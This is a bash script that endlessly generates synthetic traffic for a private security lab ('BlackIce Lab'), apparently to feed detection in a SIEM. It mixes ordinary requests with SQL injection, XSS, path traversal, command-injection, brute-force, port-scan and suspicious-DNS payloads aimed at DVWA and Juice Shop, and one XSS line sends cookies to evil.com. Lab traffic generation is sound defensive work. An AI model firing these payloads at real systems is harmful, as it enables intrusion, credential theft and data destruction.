#!/usr/bin/env bash
# traffic-loop.sh — Continuous synthetic traffic generator for BlackIce Lab
# Runs inside a Docker container, endlessly injecting randomized traffic.
# Produces: HTTP normal, SQLi, XSS, path traversal, brute-force, DNS, ICMP, port scans.

set -uo pipefail

# Lab IPs (mgmt network)
NGINX=172.42.42.100
STATICWEB=172.42.42.110
DVWA=172.42.42.122
DVWA_DB=172.42.42.121
JUICE=172.42.42.130
NAXSI=172.42.42.90
SQUID=172.42.42.95
NFTABLES=172.42.42.254
WS1=172.42.42.101
WS2=172.42.42.102
SYSLOG=172.42.42.10
ES_SIEM=172.42.42.60

ALL_WEB=($NGINX $STATICWEB $DVWA $JUICE $NAXSI)
ALL_HOSTS=($NGINX $STATICWEB $DVWA $DVWA_DB $JUICE $NAXSI $SQUID $NFTABLES $WS1 $WS2 $SYSLOG $ES_SIEM)

# Configurable via env
MIN_DELAY=${MIN_DELAY:-2}
MAX_DELAY=${MAX_DELAY:-15}
BURST_MIN=${BURST_MIN:-1}
BURST_MAX=${BURST_MAX:-5}

rand_range() { echo $(( RANDOM % ($2 - $1 + 1) + $1 )); }
rand_sleep() { sleep $(rand_range "$MIN_DELAY" "$MAX_DELAY"); }
rand_pick() { local arr=("$@"); echo "${arr[RANDOM % ${#arr[@]}]}"; }
rand_ua() {
  local uas=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
    "curl/7.81.0"
    "python-requests/2.28.1"
    "Nmap Scripting Engine"
    "sqlmap/1.6"
    "Nikto/2.1.6"
  )
  rand_pick "${uas[@]}"
}

log() { echo "[$(date '+%H:%M:%S')] $1"; }

# ---------- Traffic functions ----------

http_normal() {
  local target=$(rand_pick "${ALL_WEB[@]}")
  local port=80
  [[ "$target" == "$JUICE" ]] && port=3000
  local paths=("/" "/index.html" "/about" "/contact" "/api/Products" "/login.php" "/robots.txt" "/favicon.ico" "/sitemap.xml" "/css/style.css")
  local path=$(rand_pick "${paths[@]}")
  curl -sf -o /dev/null -m 5 -H "User-Agent: $(rand_ua)" "http://${target}:${port}${path}" 2>/dev/null
  log "HTTP GET ${target}:${port}${path}"
}

http_sqli() {
  local payloads=(
    "/vulnerabilities/sqli/?id=1'+OR+1=1--&Submit=Submit"
    "/vulnerabilities/sqli/?id=1'+UNION+SELECT+null,table_name+FROM+information_schema.tables--"
    "/vulnerabilities/sqli/?id=1'+UNION+SELECT+username,password+FROM+users--"
    "/vulnerabilities/sqli/?id=1;+DROP+TABLE+users--"
    "/vulnerabilities/sqli/?id='+OR+'1'='1"
    "/vulnerabilities/sqli/?id=1+AND+1=1+UNION+SELECT+null,version()--"
    "/vulnerabilities/sqli/?id=admin'--"
    "/vulnerabilities/sqli/?id=1+WAITFOR+DELAY+'0:0:5'--"
  )
  local payload=$(rand_pick "${payloads[@]}")
  curl -sf -o /dev/null -m 5 -H "User-Agent: $(rand_ua)" "http://${DVWA}:80${payload}" 2>/dev/null
  log "⚠ SQLi → DVWA: ${payload:0:60}..."
}

http_xss() {
  local targets=($DVWA $JUICE $NAXSI)
  local target=$(rand_pick "${targets[@]}")
  local port=80
  [[ "$target" == "$JUICE" ]] && port=3000
  local payloads=(
    "/vulnerabilities/xss_r/?name=<script>alert('xss')</script>"
    "/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(document.cookie)>"
    "/vulnerabilities/xss_r/?name=<svg/onload=alert(1)>"
    "/vulnerabilities/xss_r/?name=<body+onload=alert('XSS')>"
    "/?q=<iframe+src=javascript:alert(1)>"
    "/api/Products?q=<img+src=x+onerror=alert(1)>"
    "/?search=<script>document.location='http://evil.com/?c='+document.cookie</script>"
  )
  local payload=$(rand_pick "${payloads[@]}")
  curl -sf -o /dev/null -m 5 -H "User-Agent: $(rand_ua)" "http://${target}:${port}${payload}" 2>/dev/null
  log "⚠ XSS → ${target}: ${payload:0:50}..."
}

http_path_traversal() {
  local targets=($NGINX $STATICWEB $DVWA)
  local target=$(rand_pick "${targets[@]}")
  local payloads=(
    "/../../../../etc/passwd"
    "/..%2F..%2F..%2Fetc%2Fshadow"
    "/....//....//....//etc/passwd"
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    "/static/..%252f..%252f..%252fetc/passwd"
    "/files/../../../etc/hostname"
    "/images/../../config/database.yml"
  )
  local payload=$(rand_pick "${payloads[@]}")
  curl -sf -o /dev/null -m 5 -H "User-Agent: $(rand_ua)" "http://${target}:80${payload}" 2>/dev/null
  log "⚠ PathTraversal → ${target}: ${payload:0:50}..."
}

http_cmd_injection() {
  local payloads=(
    "/vulnerabilities/exec/?ip=127.0.0.1;cat+/etc/passwd&Submit=Submit"
    "/vulnerabilities/exec/?ip=127.0.0.1|id&Submit=Submit"
    "/vulnerabilities/exec/?ip=;whoami&Submit=Submit"
    "/vulnerabilities/exec/?ip=127.0.0.1%0als+-la&Submit=Submit"
    "/vulnerabilities/exec/?ip=\$(cat+/etc/passwd)&Submit=Submit"
  )
  local payload=$(rand_pick "${payloads[@]}")
  curl -sf -o /dev/null -m 5 -H "User-Agent: $(rand_ua)" "http://${DVWA}:80${payload}" 2>/dev/null
  log "⚠ CmdInject → DVWA: ${payload:0:60}..."
}

http_bruteforce() {
  local count=$(rand_range 3 8)
  local target=$(rand_pick "$DVWA" "$JUICE")
  log "⚠ BruteForce → ${target}: ${count} attempts"
  for i in $(seq 1 "$count"); do
    if [[ "$target" == "$DVWA" ]]; then
      curl -sf -o /dev/null -m 5 -X POST "http://${DVWA}:80/login.php" \
        -d "username=admin&password=pass${RANDOM}&Login=Login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: $(rand_ua)" 2>/dev/null
    else
      curl -sf -o /dev/null -m 5 -X POST "http://${JUICE}:3000/rest/user/login" \
        -H "Content-Type: application/json" \
        -H "User-Agent: $(rand_ua)" \
        -d "{\"email\":\"admin@juice.sh\",\"password\":\"wrong${RANDOM}\"}" 2>/dev/null
    fi
    sleep 0.3
  done
}

dns_suspicious() {
  local domains=(
    "evil-c2-server.malware.test"
    "crypto-miner-pool.io"
    "ransomware-payment.onion.ws"
    "data-exfil.attacker.xyz"
    "botnet-controller.malware.test"
    "phishing-kit.evil.test"
    "coinhive-proxy.mining.test"
    "apt28-implant.c2.test"
  )
  local domain=$(rand_pick "${domains[@]}")
  nslookup "$domain" 8.8.8.8 >/dev/null 2>&1 || true
  log "⚠ DNS → ${domain}"
}

dns_normal() {
  local domains=("google.com" "github.com" "microsoft.com" "elastic.co" "docker.com" "ubuntu.com")
  local domain=$(rand_pick "${domains[@]}")
  nslookup "$domain" 8.8.8.8 >/dev/null 2>&1 || true
  log "DNS → ${domain}"
}

icmp_sweep() {
  local count=$(rand_range 4 8)
  log "⚠ ICMP sweep: ${count} targets"
  local shuffled=($(printf '%s\n' "${ALL_HOSTS[@]}" | shuf | head -n "$count"))
  for target in "${shuffled[@]}"; do
    ping -c 1 -W 1 "$target" >/dev/null 2>&1 || true
  done
}

icmp_normal() {
  local target=$(rand_pick "${ALL_WEB[@]}")
  ping -c $(rand_range 1 3) -W 1 "$target" >/dev/null 2>&1 || true
  log "ICMP ping → ${target}"
}

port_scan() {
  local target=$(rand_pick "${ALL_WEB[@]}")
  local port_count=$(rand_range 5 16)
  local ports=(21 22 23 25 53 80 110 135 139 143 443 445 993 995 1433 3306 3389 5432 5900 8080 8443 9200)
  log "⚠ PortScan → ${target}: ${port_count} ports"
  local shuffled=($(printf '%s\n' "${ports[@]}" | shuf | head -n "$port_count"))
  for port in "${shuffled[@]}"; do
    echo "" | nc -w1 "$target" "$port" >/dev/null 2>&1 || true
  done
}

proxy_request() {
  local target=$(rand_pick "${ALL_WEB[@]}")
  local port=80
  [[ "$target" == "$JUICE" ]] && port=3000
  http_proxy="http://${SQUID}:3128" curl -sf -o /dev/null -m 5 "http://${target}:${port}/" 2>/dev/null
  log "Proxy → squid → ${target}"
}

# ---------- Weighted random action picker ----------
# Higher weight = more frequent. Benign traffic is heavier to be realistic.
pick_action() {
  local roll=$(rand_range 1 100)
  if   (( roll <= 25 )); then http_normal
  elif (( roll <= 33 )); then dns_normal
  elif (( roll <= 40 )); then icmp_normal
  elif (( roll <= 47 )); then proxy_request
  elif (( roll <= 55 )); then http_sqli
  elif (( roll <= 62 )); then http_xss
  elif (( roll <= 69 )); then http_path_traversal
  elif (( roll <= 75 )); then http_cmd_injection
  elif (( roll <= 82 )); then http_bruteforce
  elif (( roll <= 88 )); then dns_suspicious
  elif (( roll <= 94 )); then icmp_sweep
  elif (( roll <= 100 )); then port_scan
  fi
}

# ---------- Main loop ----------
echo "╔══════════════════════════════════════════════╗"
echo "║  BlackIce Lab — Continuous Traffic Injector  ║"
echo "║  MIN_DELAY=${MIN_DELAY}s  MAX_DELAY=${MAX_DELAY}s             ║"
echo "║  Press Ctrl+C to stop                       ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Graceful shutdown
trap 'echo ""; log "Shutting down traffic injector..."; exit 0' SIGTERM SIGINT

# Initial delay to let other services start
sleep "${STARTUP_DELAY:-10}"

while true; do
  # Do a burst of actions
  burst=$(rand_range "$BURST_MIN" "$BURST_MAX")
  for _ in $(seq 1 "$burst"); do
    pick_action
    sleep "0.$(rand_range 2 8)"
  done
  rand_sleep
done
